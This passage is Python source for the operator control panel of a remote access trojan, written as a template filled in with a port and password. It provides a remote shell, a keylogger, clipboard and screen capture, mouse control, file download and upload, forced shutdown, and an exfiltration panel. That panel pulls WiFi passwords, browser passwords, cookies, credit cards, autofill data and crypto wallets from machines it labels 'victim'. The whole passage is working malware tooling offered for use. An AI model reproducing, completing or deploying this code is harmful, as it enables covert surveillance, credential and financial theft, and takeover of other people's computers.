            ctk.CTkButton(pf, text=label, command=lambda c=cmd: self._power_action(c), fg_color=color, hover_color=color, text_color="#000000", height=28, font=("Segoe UI", 10, "bold")).pack(fill="x", pady=2)

        ctk.CTkFrame(right, fg_color="#2a2a3a", height=1).pack(fill="x", padx=12, pady=8)
        ctk.CTkLabel(right, text="ACTIONS", font=("Segoe UI", 11, "bold"), text_color="#7c5cff").pack(padx=12, pady=(0, 4), anchor="w")
        af = ctk.CTkFrame(right, fg_color="transparent")
        af.pack(fill="x", padx=8, pady=4)
        ctk.CTkButton(af, text="Chat Message", command=self._send_chat_popup, fg_color="#7c5cff", hover_color="#9b7eff", text_color="#000000", height=30).pack(fill="x", pady=2)
        ctk.CTkButton(af, text="Refresh Clipboard", command=self._refresh_clipboard, fg_color="#fbbf24", hover_color="#f59e0b", text_color="#000000", height=30).pack(fill="x", pady=2)
        ctk.CTkButton(af, text="Screenshot", command=self._take_screenshot, fg_color="#22d3ee", hover_color="#22d3ee", text_color="#000000", height=30).pack(fill="x", pady=2)

        ctk.CTkFrame(right, fg_color="#2a2a3a", height=1).pack(fill="x", padx=12, pady=8)
        ctk.CTkLabel(right, text="INFO", font=("Segoe UI", 11, "bold"), text_color="#22d3ee").pack(padx=12, pady=(0, 4), anchor="w")
        self.info_text = ctk.CTkTextbox(right, fg_color="#1e1e2a", text_color="#e8e8e8", font=("Consolas", 10), height=200)
        self.info_text.pack(fill="x", padx=8, pady=(0, 8))

        self.status_bar = ctk.CTkFrame(self.root, fg_color="#0e0e16", height=28)
        self.status_bar.pack(fill="x", side="bottom")
        self.status_label = ctk.CTkLabel(self.status_bar, text="Ready", font=("Consolas", 9), text_color="#555555")
        self.status_label.pack(side="left", padx=12)

    def _build_feature_terminal(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color="#12121a")
        inp = ctk.CTkFrame(frame, fg_color="transparent")
        inp.pack(fill="x", padx=8, pady=8)
        ctk.CTkLabel(inp, text="$", font=("Consolas", 14, "bold"), text_color="#4ade80").pack(side="left", padx=(0, 4))
        self.shell_input = ctk.CTkEntry(inp, placeholder_text="Enter command...", fg_color="#1e1e2a", text_color="#4ade80", border_color="#2a2a3a", font=("Consolas", 12), height=36)
        self.shell_input.pack(side="left", fill="x", expand=True)
        self.shell_input.bind("<Return>", self._send_shell_command)
        ctk.CTkButton(inp, text="Run", command=self._send_shell_command, fg_color="#4ade80", hover_color="#22c55e", text_color="#000000", width=60, height=36, font=("Consolas", 11, "bold")).pack(side="right", padx=(4, 0))
        self.shell_text = ctk.CTkTextbox(frame, fg_color="#000000", text_color="#4ade80", font=("Consolas", 11), height=400)
        self.shell_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self._terminal_frame = frame

    def _build_feature_processes(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color="#12121a")
        btn = ctk.CTkFrame(frame, fg_color="transparent")
        btn.pack(fill="x", padx=8, pady=8)
        ctk.CTkButton(btn, text="Refresh", command=self._refresh_processes, fg_color="#4ade80", hover_color="#22c55e", text_color="#000000", height=30).pack(side="left", padx=(0, 4))
        ctk.CTkButton(btn, text="Kill Selected", command=self._kill_selected_process, fg_color="#f87171", hover_color="#ef4444", text_color="#000000", height=30).pack(side="left", padx=4)
        self.process_tree = ctk.CTkTextbox(frame, fg_color="#000000", text_color="#e8e8e8", font=("Consolas", 10))
        self.process_tree.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self._processes_frame = frame

    def _build_feature_keylog(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color="#12121a")
        btn = ctk.CTkFrame(frame, fg_color="transparent")
        btn.pack(fill="x", padx=8, pady=8)
        self.keylog_btn = ctk.CTkButton(btn, text="Start Keylogger", command=self._toggle_keylog, fg_color="#4ade80", hover_color="#22c55e", text_color="#000000", height=30)
        self.keylog_btn.pack(side="left", padx=(0, 4))
        ctk.CTkButton(btn, text="Clear", command=lambda: self.keylog_text.delete("1.0", "end"), fg_color="#1e1e2a", hover_color="#2a2a3a", text_color="#e8e8e8", height=30).pack(side="left", padx=4)
        self.keylog_text = ctk.CTkTextbox(frame, fg_color="#000000", text_color="#4ade80", font=("Consolas", 12))
        self.keylog_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self._keylog_frame = frame

    def _build_feature_clipboard(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color="#12121a")
        ctk.CTkButton(frame, text="Get Clipboard", command=self._refresh_clipboard, fg_color="#4ade80", hover_color="#22c55e", text_color="#000000", height=30).pack(padx=8, pady=8, anchor="w")
        self.clipboard_text = ctk.CTkTextbox(frame, fg_color="#000000", text_color="#fbbf24", font=("Consolas", 12))
        self.clipboard_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self._clipboard_frame = frame

    def _build_feature_chat(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color="#12121a")
        self.chat_display = ctk.CTkTextbox(frame, fg_color="#000000", text_color="#e8e8e8", font=("Segoe UI", 11))
        self.chat_display.pack(fill="both", expand=True, padx=8, pady=8)
        inp = ctk.CTkFrame(frame, fg_color="transparent")
        inp.pack(fill="x", padx=8, pady=(0, 8))
        self.chat_input = ctk.CTkEntry(inp, placeholder_text="Type message...", fg_color="#1e1e2a", text_color="#e8e8e8", border_color="#2a2a3a", font=("Segoe UI", 11), height=36)
        self.chat_input.pack(side="left", fill="x", expand=True)
        self.chat_input.bind("<Return>", self._send_chat)
        ctk.CTkButton(inp, text="Send", command=self._send_chat, fg_color="#7c5cff", hover_color="#9b7eff", text_color="#000000", width=60, height=36).pack(side="right", padx=(4, 0))
        self._chat_frame = frame

    def _build_feature_exfil(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color="#12121a")
        btn = ctk.CTkFrame(frame, fg_color="transparent")
        btn.pack(fill="x", padx=8, pady=8)
        for label, exfil_type in [("System Info", "system_info"), ("WiFi Passwords", "wifi_passwords"), ("Browser Creds", "browser_creds"), ("Browser Cookies", "browser_cookies"), ("File List", "file_list"), ("Geoloc IP", "geolocation"), ("Infostealer", "infostealer"), ("Crypto Stealer", "crypto_stealer")]:
            ctk.CTkButton(btn, text=label, command=lambda t=exfil_type: self._request_exfil(t), fg_color="#1e1e2a", hover_color="#2a2a3a", text_color="#e8e8e8", height=30).pack(side="left", padx=2)
        self.exfil_text = ctk.CTkTextbox(frame, fg_color="#000000", text_color="#e8e8e8", font=("Consolas", 10))
        self.exfil_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self._exfil_frame = frame

    def _build_feature_files(self):
        frame = ctk.CTkFrame(self.feature_container, fg_color="#12121a")
        nav = ctk.CTkFrame(frame, fg_color="transparent")
        nav.pack(fill="x", padx=8, pady=8)
        ctk.CTkButton(nav, text="< Back", command=self._file_browse_back, fg_color="#1e1e2a", hover_color="#2a2a3a", text_color="#e8e8e8", width=60, height=30).pack(side="left", padx=(0, 4))
        self.file_path_entry = ctk.CTkEntry(nav, placeholder_text="Enter path...", fg_color="#1e1e2a", text_color="#e8e8e8", border_color="#2a2a3a", font=("Consolas", 11), height=30)
        self.file_path_entry.pack(side="left", fill="x", expand=True, padx=4)
        self.file_path_entry.bind("<Return>", self._file_browse_go)
        ctk.CTkButton(nav, text="Go", command=self._file_browse_go, fg_color="#7c5cff", hover_color="#9b7eff", text_color="#000000", width=40, height=30).pack(side="left", padx=4)
        ctk.CTkButton(nav, text="Refresh", command=self._file_browse_refresh, fg_color="#4ade80", hover_color="#22c55e", text_color="#000000", width=60, height=30).pack(side="left", padx=4)
        bf = ctk.CTkFrame(frame, fg_color="transparent")
        bf.pack(fill="x", padx=8, pady=(0, 4))
        ctk.CTkButton(bf, text="Download", command=self._file_download, fg_color="#22d3ee", hover_color="#22d3ee", text_color="#000000", height=28).pack(side="left", padx=2)
        ctk.CTkButton(bf, text="Upload", command=self._file_upload, fg_color="#fbbf24", hover_color="#f59e0b", text_color="#000000", height=28).pack(side="left", padx=2)
        self.file_list_text = ctk.CTkTextbox(frame, fg_color="#000000", text_color="#e8e8e8", font=("Consolas", 10))
        self.file_list_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self.file_list_text.bind("<Double-Button-1>", self._file_browse_double_click)
        self._files_frame = frame
        self._current_browse_path = ""
        self._browse_history = []
        self._pending_download = None

    def _switch_feature(self):
        self._show_feature(self.feature_var.get())

    def _show_feature(self, name):
        for w in self.feature_container.winfo_children():
            w.pack_forget()
        m = {{"screen": None, "terminal": self._terminal_frame, "processes": self._processes_frame, "keylog": self._keylog_frame, "clipboard": self._clipboard_frame, "chat": self._chat_frame, "files": self._files_frame, "exfil": self._exfil_frame}}
        f = m.get(name)
        if f:
            f.pack(in_=self.feature_container, fill="both", expand=True)

    def _on_client_connect(self, client_id, info):
        self.root.after(0, self._add_client_ui, client_id, info)

    def _on_client_disconnect(self, client_id):
        self.root.after(0, self._remove_client_ui, client_id)

    def _on_screen_frame(self, client_id, frame_data):
        if client_id != self.current_client:
            return
        with self._frame_lock:
            if self._frame_skip:
                return
            self._frame_skip = True
        try:
            img = Image.open(io.BytesIO(frame_data))
            self.root.after(0, self._update_screen, img, len(frame_data))
        except Exception as e:
            logger.error(f"Screen display error: {{e}}")

    def _update_screen(self, img=None, frame_size=0):
        with self._frame_lock:
            self._frame_skip = False
        if img is not None:
            cw = self.screen_canvas.winfo_width()
            ch = self.screen_canvas.winfo_height()
            if cw > 1 and ch > 1:
                try:
                    resample = Image.Resampling.BILINEAR
                except AttributeError:
                    resample = Image.BILINEAR
                img = img.resize((cw, ch), resample)
                self._photo = ImageTk.PhotoImage(img)
                self.screen_canvas.delete("all")
                self.screen_canvas.create_image(0, 0, anchor="nw", image=self._photo)
                if frame_size > 0:
                    self.fps_label.configure(text=f"{{frame_size // 1024}} KB")
            else:
                self.root.after(50, self._update_screen, img, frame_size)

    def _on_exfil_data(self, client_id, exfil_type, data):
        if exfil_type == "file_browse":
            self.root.after(0, self._handle_file_browse, client_id, data)
        elif exfil_type == "file_download":
            self.root.after(0, self._handle_exfil, exfil_type, data)
        else:
            self.root.after(0, self._show_exfil, exfil_type, data)

    def _handle_exfil(self, exfil_type, data):
        self.exfil_text.delete("1.0", "end")
        self.exfil_text.insert("end", f"=== {{exfil_type.upper()}} ===\\n\\n")
        if isinstance(data, dict):
            for key, value in data.items():
                self.exfil_text.insert("end", f"{{key}}: {{value}}\\n")
        else:
            self.exfil_text.insert("end", str(data))
        self.status_label.configure(text=f"{{exfil_type}} received")

    def _on_shell_output(self, client_id, data):
        self.root.after(0, self._handle_shell_output, data)

    def _on_process_data(self, client_id, data):
        self.root.after(0, self._handle_process_data, data)

    def _on_keylog_data(self, client_id, data):
        self.root.after(0, self._handle_keylog_data, data)

    def _on_clipboard_data(self, client_id, data):
        self.root.after(0, self._handle_clipboard_data, data)

    def _on_chat_display(self, client_id, data):
        self.root.after(0, self._handle_chat_display_msg, data)

    def _on_file_browse(self, client_id, data):
        self.root.after(0, self._handle_file_browse, client_id, data)

    def _on_file_download_data(self, client_id, data, raw_data):
        self.root.after(0, self._handle_file_download_data, client_id, data, raw_data)

    def _on_file_transfer_end(self, client_id, data):
        def _update():
            status = data.get("status", "")
            if status == "done":
                self.status_label.configure(text=f"File saved: {{data.get('path', '?')}} ({{data.get('size', 0)}} bytes)")
            else:
                self.status_label.configure(text=f"Transfer error: {{data.get('error', 'unknown')}}")
        self.root.after(0, _update)

    def _add_client_ui(self, client_id, info):
        os_icon = {{"Windows": "W", "Linux": "L", "Darwin": "M"}}.get(info.get("os", ""), "?")
        card = ctk.CTkFrame(self.client_list, fg_color="#1e1e2a", corner_radius=8, height=60)
        card.pack(fill="x", pady=2, padx=4)
        card.pack_propagate(False)
        ctk.CTkLabel(card, text=os_icon, font=("Segoe UI", 16, "bold"), text_color="#7c5cff", width=30).pack(side="left", padx=(8, 4))
        info_f = ctk.CTkFrame(card, fg_color="transparent")
        info_f.pack(side="left", fill="both", expand=True, pady=4)
        ctk.CTkLabel(info_f, text=info.get("hostname", "Unknown"), font=("Segoe UI", 11, "bold"), text_color="#e8e8e8").pack(anchor="w")
        ctk.CTkLabel(info_f, text=client_id, font=("Consolas", 9), text_color="#888888").pack(anchor="w")
        card.bind("<Button-1>", lambda e, cid=client_id: self._select_client(cid))
        for child in card.winfo_children():
            child.bind("<Button-1>", lambda e, cid=client_id: self._select_client(cid))
            for sub in child.winfo_children():
                sub.bind("<Button-1>", lambda e, cid=client_id: self._select_client(cid))

    def _remove_client_ui(self, client_id):
        if client_id == self.current_client:
            self.current_client = None
            self._stream_active = False
            self._control_active = False
            self.client_label.configure(text="No client selected")
            self.screen_canvas.delete("all")
            self.stream_btn.configure(text="  Start Stream  ", fg_color="#4ade80")
            self.control_btn.configure(text="  Enable Control  ", fg_color="#fbbf24")
        self._refresh_clients()

    def _select_client(self, client_id):
        self.current_client = client_id
        clients = self.server.get_clients()
        info = clients.get(client_id, {{}})
        self.client_label.configure(text=f"{{info.get('hostname', '?')}} ({{client_id}})")
        monitors = info.get("monitors", [])
        mnames = ["All Screens"]
        for m in monitors:
            mname = m.get("name", "Monitor")
            mw = m.get("width", "?")
            mh = m.get("height", "?")
            mnames.append(f"{{mname}} ({{mw}}x{{mh}})")
        self.monitor_menu.configure(values=mnames)
        self.monitor_var.set("All Screens")
        self.info_text.delete("1.0", "end")
        self.info_text.insert("end", f"Host: {{info.get('hostname', '?')}}\\nUser: {{info.get('username', '?')}}\\nOS: {{info.get('os', '?')}} {{info.get('arch', '')}}\\nMonitors: {{len(monitors)}}")

    def _refresh_clients(self):
        for w in self.client_list.winfo_children():
            w.destroy()
        for cid, info in self.server.get_clients().items():
            self._add_client_ui(cid, info)

    def _on_monitor_select(self, choice):
        if not self.current_client:
            return
        monitors = self.server.get_clients().get(self.current_client, {{}}).get("monitors", [])
        if choice == "All Screens":
            self.server.select_monitor(self.current_client, 0)
        else:
            for m in monitors:
                self.server.select_monitor(self.current_client, m.get("index", 0))
                break

    def _toggle_stream(self):
        if not self.current_client:
            return
        if self._stream_active:
            self.server.stop_screen(self.current_client)
            self._stream_active = False
            self.stream_btn.configure(text="  Start Stream  ", fg_color="#4ade80")
        else:
            self.server.start_screen(self.current_client)
            self._stream_active = True
            self.stream_btn.configure(text="  Stop Stream  ", fg_color="#f87171")

    def _toggle_control(self):
        if not self.current_client:
            return
        if self._control_active:
            self.server.disable_control(self.current_client)
            self._control_active = False
            self.control_btn.configure(text="  Enable Control  ", fg_color="#fbbf24")
        else:
            self.server.enable_control(self.current_client)
            self._control_active = True
            self.control_btn.configure(text="  Disable Control  ", fg_color="#f87171")

    def _request_exfil(self, exfil_type):
        if self.current_client:
            self.server.request_exfil(self.current_client, exfil_type)

    def _show_exfil(self, exfil_type, data):
        self.exfil_text.delete("1.0", "end")
        self.exfil_text.insert("end", f"=== {{exfil_type.upper()}} ===\\n\\n")
        if exfil_type == "browser_cookies":
            for browser in ["chrome", "edge"]:
                cookies = data.get(browser, [])
                if cookies:
                    self.exfil_text.insert("end", f"--- {{browser.upper()}} ({{len(cookies)}} cookies) ---\\n\\n")
                    by_domain = {{}}
                    for c in cookies:
                        domain = c.get("host", "?")
                        if domain not in by_domain:
                            by_domain[domain] = []
                        by_domain[domain].append(c)
                    for domain in sorted(by_domain.keys()):
                        self.exfil_text.insert("end", f"\\n{{domain}}:\\n")
                        for c in by_domain[domain]:
                            secure = " [Secure]" if c.get("secure") else ""
                            self.exfil_text.insert("end", f"  {{c.get('name', '?')}}={{c.get('value', '?')[:80]}}{{secure}}\\n")
        elif exfil_type == "infostealer":
            for browser_name in ["chrome", "edge", "brave", "opera", "vivaldi", "firefox"]:
                browser_data = data.get(browser_name, {{}})
                if not browser_data:
                    continue
                self.exfil_text.insert("end", f"\\n{'='*50}\\n  {{browser_name.upper()}}\\n{'='*50}\\n")
                passwords = browser_data.get("passwords", [])
                if passwords:
                    self.exfil_text.insert("end", f"\\n--- Passwords ({{len(passwords)}}) ---\\n")
                    for p in passwords[:100]:
                        self.exfil_text.insert("end", f"  {{p.get('url', '?')}} | {{p.get('username', '?')}} | {{p.get('password', '?')}}\\n")
                cookies = browser_data.get("cookies", [])
                if cookies:
                    self.exfil_text.insert("end", f"\\n--- Cookies ({{len(cookies)}}) ---\\n")
                    for c in cookies[:200]:
                        self.exfil_text.insert("end", f"  {{c.get('host', '?')}} | {{c.get('name', '?')}}={{c.get('value', '?')[:60]}}\\n")
                autofill = browser_data.get("autofill", [])
                if autofill:
                    self.exfil_text.insert("end", f"\\n--- Autofill ({{len(autofill)}}) ---\\n")
                    for a in autofill[:50]:
                        self.exfil_text.insert("end", f"  {{a.get('name', '?')}} = {{a.get('value', '?')}}\\n")
                cards = browser_data.get("credit_cards", [])
                if cards:
                    self.exfil_text.insert("end", f"\\n--- Credit Cards ({{len(cards)}}) ---\\n")
                    for cc in cards:
                        self.exfil_text.insert("end", f"  {{cc.get('name', '?')}} | {{cc.get('number', '?')}} | Exp: {{cc.get('expiry', '?')}}\\n")
                history = browser_data.get("history", [])
                if history:
                    self.exfil_text.insert("end", f"\\n--- History ({{len(history)}} entries) ---\\n")
                    for h in history[:50]:
                        self.exfil_text.insert("end", f"  [{{h.get('visits', 0)}}x] {{h.get('title', '?')[:40]}} | {{h.get('url', '?')[:60]}}\\n")
                bookmarks = browser_data.get("bookmarks", [])
                if bookmarks:
                    self.exfil_text.insert("end", f"\\n--- Bookmarks ({{len(bookmarks)}}) ---\\n")
                    for b in bookmarks[:50]:
                        self.exfil_text.insert("end", f"  {{b.get('name', '?')}} | {{b.get('url', '?')}}\\n")
        elif exfil_type == "crypto_stealer":
            wallets = data.get("desktop_wallets", [])
            if wallets:
                self.exfil_text.insert("end", f"--- Desktop Wallets ({{len(wallets)}}) ---\\n\\n")
                for w in wallets:
                    status_icon = "[FOUND]" if w.get("status") == "found" else "[NOT FOUND]"
                    self.exfil_text.insert("end", f"  {{status_icon}} {{w.get('name', '?')}}\\n")
                    self.exfil_text.insert("end", f"    Path: {{w.get('path', '?')}}\\n")
                    if w.get("files"):
                        self.exfil_text.insert("end", f"    Files: {{', '.join(w['files'][:10])}}\\n")
                    elif w.get("size"):
                        self.exfil_text.insert("end", f"    Size: {{w['size']}} bytes\\n")
                    self.exfil_text.insert("end", "\\n")
            extensions = data.get("browser_extensions", [])
            if extensions:
                self.exfil_text.insert("end", f"\\n--- Browser Extensions ({{len(extensions)}}) ---\\n\\n")
                for ext in extensions:
                    status_icon = "[FOUND]" if ext.get("status") == "found" else "[NOT FOUND]"
                    self.exfil_text.insert("end", f"  {{status_icon}} {{ext.get('name', '?')}} ({{ext.get('extension_id', '?')}})\\n")
                    if ext.get("files"):
                        self.exfil_text.insert("end", f"    Files: {{', '.join(ext['files'][:10])}}\\n")
                    self.exfil_text.insert("end", "\\n")
        elif isinstance(data, dict):
            for key, value in data.items():
                self.exfil_text.insert("end", f"{{key}}: {{value}}\\n")
        else:
            self.exfil_text.insert("end", str(data))
        self.status_label.configure(text=f"{{exfil_type}} received")

    def _send_shell_command(self, event=None):
        if not self.current_client:
            return
        cmd = self.shell_input.get().strip()
        if not cmd:
            return
        self.shell_input.delete(0, "end")
        self.shell_text.insert("end", f"$ {{cmd}}\\n")
        self.shell_text.see("end")
        self.server.exec_shell(self.current_client, cmd)

    def _handle_shell_output(self, data):
        output = data.get("output", "")
        if output:
            self.shell_text.insert("end", f"{{output}}\\n")
            self.shell_text.see("end")

    def _refresh_processes(self):
        if self.current_client:
            self.server.request_processes(self.current_client)

    def _handle_process_data(self, data):
        if "error" in data:
            self.process_tree.delete("1.0", "end")
            self.process_tree.insert("end", f"Error: {{data['error']}}")
            return
        procs = data.get("processes", [])
        self._process_data = procs
        self.process_tree.delete("1.0", "end")
        self.process_tree.insert("end", f"{{'PID':>8}}  {{'Name':<35}} {{'User':<20}} {{'CPU%':>6}} {{'Mem%':>6}}\\n")
        self.process_tree.insert("end", "-" * 80 + "\\n")
        for p in sorted(procs, key=lambda x: x.get("cpu", 0), reverse=True):
            self.process_tree.insert("end", f"{{p.get('pid', 0):>8}}  {{p.get('name', '?'):<35}} {{p.get('username', '?'):<20}} {{p.get('cpu', 0):>5.1f}}% {{p.get('memory', 0):>5.1f}}%\\n")

    def _kill_selected_process(self):
        if not self.current_client or not self._process_data:
            return
        try:
            cursor_pos = self.process_tree.index("insert")
            line_num = int(cursor_pos.split(".")[0])
            if line_num < 3:
                return
            content = self.process_tree.get("1.0", "end")
            lines = content.strip().split("\\n")
            if line_num < len(lines):
                parts = lines[line_num - 1].split()
                if parts:
                    pid = int(parts[0])
                    if messagebox.askyesno("Kill Process", f"Kill process {{pid}}?"):
                        self.server.kill_process(self.current_client, pid)
        except Exception:
            pass

    def _toggle_keylog(self):
        if not self.current_client:
            return
        if self._keylog_active:
            self.server.stop_keylog(self.current_client)
            self._keylog_active = False
            self.keylog_btn.configure(text="Start Keylogger", fg_color="#4ade80")
        else:
            self.server.start_keylog(self.current_client)
            self._keylog_active = True
            self.keylog_btn.configure(text="Stop Keylogger", fg_color="#f87171")

    def _handle_keylog_data(self, data):
        keys = data.get("keys", "")
        if keys:
            self.keylog_text.insert("end", keys)
            self.keylog_text.see("end")

    def _refresh_clipboard(self):
        if self.current_client:
            self.server.get_clipboard(self.current_client)

    def _handle_clipboard_data(self, data):
        self.clipboard_text.delete("1.0", "end")
        self.clipboard_text.insert("end", data.get("content", ""))

    def _send_chat(self, event=None):
        if not self.current_client:
            return
        msg = self.chat_input.get().strip()
        if not msg:
            return
        self.chat_input.delete(0, "end")
        self.server.send_chat(self.current_client, msg)
        ts = time.strftime("%H:%M:%S")
        self.chat_display.insert("end", f"[{{ts}}] YOU: {{msg}}\\n")
        self.chat_display.see("end")

    def _send_chat_popup(self):
        if not self.current_client:
            return
        dialog = ctk.CTkToplevel(self.root)
        dialog.title("Send Message")
        dialog.geometry("400x150")
        dialog.configure(fg_color="#12121a")
        dialog.transient(self.root)
        dialog.grab_set()
        ctk.CTkLabel(dialog, text="Message to display on victim's screen:", font=("Segoe UI", 11), text_color="#e8e8e8").pack(padx=16, pady=(16, 8), anchor="w")
        entry = ctk.CTkEntry(dialog, placeholder_text="Enter message...", fg_color="#1e1e2a", text_color="#e8e8e8", border_color="#2a2a3a", font=("Segoe UI", 11), width=360, height=36)
        entry.pack(padx=16, pady=4)
        entry.focus()
        def send():
            m = entry.get().strip()
            if m:
                self.server.send_chat(self.current_client, m)
                ts = time.strftime("%H:%M:%S")
                self.chat_display.insert("end", f"[{{ts}}] YOU: {{m}}\\n")
                self.chat_display.see("end")
                dialog.destroy()
        entry.bind("<Return>", lambda e: send())
        ctk.CTkButton(dialog, text="Send", command=send, fg_color="#7c5cff", hover_color="#9b7eff", text_color="#000000", height=32).pack(pady=8)

    def _handle_chat_display_msg(self, data):
        msg = data.get("message", "")
        if msg:
            ts = time.strftime("%H:%M:%S")
            self.chat_display.insert("end", f"[{{ts}}] VICTIM: {{msg}}\\n")
            self.chat_display.see("end")

    def _take_screenshot(self):
        if not self.current_client:
            return
        self.server.take_screenshot(self.current_client)
        self.status_label.configure(text="Taking screenshot...")

    def _file_browse_go(self, event=None):
        if not self.current_client:
            return
        path = self.file_path_entry.get().strip()
        self.server.browse_directory(self.current_client, path)
        self.status_label.configure(text=f"Browsing: {{path}}")

    def _file_browse_back(self):
        if not self.current_client or not self._browse_history:
            return
        prev = self._browse_history.pop()
        self.server.browse_directory(self.current_client, prev)
        self.status_label.configure(text=f"Browsing: {{prev}}")

    def _file_browse_refresh(self):
        if not self.current_client:
            return
        self.server.browse_directory(self.current_client, self._current_browse_path)

    def _file_browse_double_click(self, event):
        if not self.current_client:
            return
        try:
            cursor_pos = self.file_list_text.index("insert")
            line_num = int(cursor_pos.split(".")[0])
            content = self.file_list_text.get("1.0", "end")
            lines = content.strip().split("\\n")
            if line_num > 0 and line_num < len(lines):
                line = lines[line_num - 1].strip()
                if line.startswith("[DIR] "):
                    name = line[6:]
                    if self._current_browse_path:
                        new_path = self._current_browse_path.rstrip("\\\\") + "\\\\" + name
                    else:
                        new_path = name
                    self._browse_history.append(self._current_browse_path)
                    self.server.browse_directory(self.current_client, new_path)
                    self.status_label.configure(text=f"Browsing: {{new_path}}")
        except Exception:
            pass

    def _handle_file_browse(self, client_id, data):
        path = data.get("path", "")
        entries = data.get("entries", [])
        self._current_browse_path = path
        self.file_path_entry.delete(0, "end")
        self.file_path_entry.insert(0, path)
        self.file_list_text.delete("1.0", "end")
        if not path:
            self.file_list_text.insert("end", "=== DRIVES ===\\n\\n")
        else:
            self.file_list_text.insert("end", f"=== {{path}} ===\\n\\n")
        dirs = sorted([e for e in entries if e.get("is_dir")], key=lambda x: x["name"].lower())
        files = sorted([e for e in entries if not e.get("is_dir")], key=lambda x: x["name"].lower())
        for e in dirs:
            self.file_list_text.insert("end", f"[DIR]  {{e['name']}}\\n")
        for e in files:
            size = e.get("size", 0)
            if size > 1024 * 1024:
                size_str = f"{{size / (1024 * 1024):.1f}} MB"
            elif size > 1024:
                size_str = f"{{size / 1024:.1f}} KB"
            else:
                size_str = f"{{size}} B"
            self.file_list_text.insert("end", f"[FILE] {{e['name']}}  ({{size_str}})\\n")
        self.status_label.configure(text=f"{{len(dirs)}} dirs, {{len(files)}} files")

    def _file_download(self):
        if not self.current_client:
            return
        try:
            cursor_pos = self.file_list_text.index("insert")
            line_num = int(cursor_pos.split(".")[0])
            content = self.file_list_text.get("1.0", "end")
            lines = content.strip().split("\\n")
            if line_num > 0 and line_num < len(lines):
                line = lines[line_num - 1].strip()
                if line.startswith("[FILE] "):
                    name = line[7:].split("  (")[0]
                    if self._current_browse_path:
                        remote_path = self._current_browse_path.rstrip("\\\\") + "\\\\" + name
                    else:
                        remote_path = name
                    from tkinter import filedialog
                    save_path = filedialog.asksaveasfilename(initialfile=name)
                    if save_path:
                        self._pending_download = {{"remote": remote_path, "local": save_path}}
                        self.server.download_file(self.current_client, remote_path)
                        self.status_label.configure(text=f"Downloading: {{name}}")
        except Exception:
            pass

    def _handle_file_download_data(self, client_id, data, raw_data):
        if hasattr(self, "_pending_download") and self._pending_download:
            try:
                with open(self._pending_download["local"], "wb") as f:
                    f.write(raw_data)
                self.status_label.configure(text=f"Saved: {{self._pending_download['local']}}")
            except Exception as e:
                self.status_label.configure(text=f"Save error: {{e}}")
            self._pending_download = None

    def _file_upload(self):
        if not self.current_client:
            return
        from tkinter import filedialog
        filepath = filedialog.askopenfilename()
        if filepath:
            import os as _os
            filename = _os.path.basename(filepath)
            if self._current_browse_path:
                dest = self._current_browse_path.rstrip("\\\\") + "\\\\" + filename
            else:
                dest = filename
            self.server.upload_file(self.current_client, filepath, dest)
            self.status_label.configure(text=f"Uploading: {{filename}}")

    def _power_action(self, action):
        if not self.current_client:
            return
        labels = {{"shutdown": "SHUTDOWN", "restart": "RESTART", "logoff": "LOGOFF"}}
        if messagebox.askyesno("Confirm", f"{{labels.get(action, action)}} the victim?"):
            {{"shutdown": self.server.shutdown_client, "restart": self.server.restart_client, "logoff": self.server.logoff_client}}.get(action, lambda x: None)(self.current_client)

    def _on_mouse_click(self, event):
        if self._control_active and self.current_client:
            self.server.send_input(self.current_client, "mouse_click", x=event.x, y=event.y, button="left")

    def _on_mouse_drag(self, event):
        if self._control_active and self.current_client:
            self.server.send_input(self.current_client, "mouse_move", x=event.x, y=event.y)

    def _on_mouse_release(self, event):
        pass

    def _on_mouse_double(self, event):
        if self._control_active and self.current_client:
            self.server.send_input(self.current_client, "mouse_double", x=event.x, y=event.y)

    def _on_mouse_scroll(self, event):
        if self._control_active and self.current_client:
            amount = -1 if event.delta > 0 else 1
            self.server.send_input(self.current_client, "mouse_scroll", x=event.x, y=event.y, amount=amount)

    def _poll_clients(self):
        self._refresh_clients()
        self.root.after(2000, self._poll_clients)

    def run(self):
        self.root.mainloop()

    def stop(self):
        self.server.stop()
        self.root.destroy()


def main():
    server = HackerServer(port={port}, password="{password}")
    server.start()
    gui = HackerGUI(server)
    gui.run()
    server.stop()


if __name__ == "__main__":
    main()
'''
